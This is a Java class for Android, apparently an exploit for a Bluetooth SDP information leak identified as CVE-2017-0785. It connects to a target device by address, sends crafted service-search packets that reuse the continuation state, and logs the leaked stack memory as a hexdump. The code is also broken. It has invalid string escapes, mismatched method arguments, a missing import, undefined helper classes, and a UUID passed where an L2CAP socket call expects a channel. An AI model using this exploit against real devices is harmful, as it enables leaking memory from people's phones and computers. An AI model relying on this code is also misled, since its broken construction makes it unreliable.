import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothSocket;
import android.util.Log;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.UUID;

public class CVE20170785Exploit {

    private static final String TAG = "CVE20170785Exploit";
    private static final UUID L2CAP_UUID = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB");

    private BluetoothSocket socket;
    private InputStream inputStream;
    private OutputStream outputStream;

    public void exploit(String target) {
        try {
            BluetoothDevice device = BluetoothAdapter.getDefaultAdapter().getRemoteDevice(target);
            socket = device.createInsecureL2capSocket(L2CAP_UUID);
            socket.connect();

            inputStream = socket.getInputStream();
            outputStream = socket.getOutputStream();

            sendPacket(serviceLong(), "\x00");
            byte[] data = receiveData();

            if (data[data.length - 3] != 0x02) {
                Log.e(TAG, "Invalid continuation state received.");
                return;
            }

            StringBuilder stack = new StringBuilder();

            for (int i = 1; i < 30; i++) {
                Log.i(TAG, "Sending packet " + i);
                sendPacket(serviceShort(), new String[]{Character.toString((char) data[data.length - 3])});
                data = receiveData();
                stack.append(new String(data, 9, data.length - 12));
            }

            closeSocket();
            Log.i(TAG, "Done");
            Log.i(TAG, hexdump(stack.toString()));
        } catch (IOException e) {
            Log.e(TAG, "IOException: " + e.getMessage());
        }
    }

    private void sendPacket(String[] service, String continuationState) throws IOException {
        byte[] pkt = new byte[]{0x02, 0x00, 0x00};
        pkt = ByteArrayUtils.concatenateArrays(pkt, ShortUtils.toBytes((short) (7 + continuationState.length())));
        pkt = ByteArrayUtils.concatenateArrays(pkt, new byte[]{0x35, 0x03, 0x19});
        pkt = ByteArrayUtils.concatenateArrays(pkt, ShortUtils.toBytes(service));
        pkt = ByteArrayUtils.concatenateArrays(pkt, new byte[]{0x01, 0x00});
        pkt = ByteArrayUtils.concatenateArrays(pkt, continuationState.getBytes());
        outputStream.write(pkt);
    }

    private byte[] receiveData() throws IOException {
        byte[] buffer = new byte[50];
        int bytesRead = inputStream.read(buffer);
        byte[] data = new byte[bytesRead];
        System.arraycopy(buffer, 0, data, 0, bytesRead);
        return data;
    }

    private String[] serviceLong() {
        return new String[]{Character.toString((char) 0x00)};
    }

    private String[] serviceShort() {
        return new String[]{Character.toString((char) 0x01)};
    }

    private void closeSocket() {
        try {
            if (socket != null) {
                socket.close();
            }
        } catch (IOException e) {
            Log.e(TAG, "IOException during socket close: " + e.getMessage());
        }
    }

    private String hexdump(String input) {
        StringBuilder hex = new StringBuilder();
        for (char character : input.toCharArray()) {
            hex.append(String.format("%02X ", (int) character));
        }
        return hex.toString();
    }
}
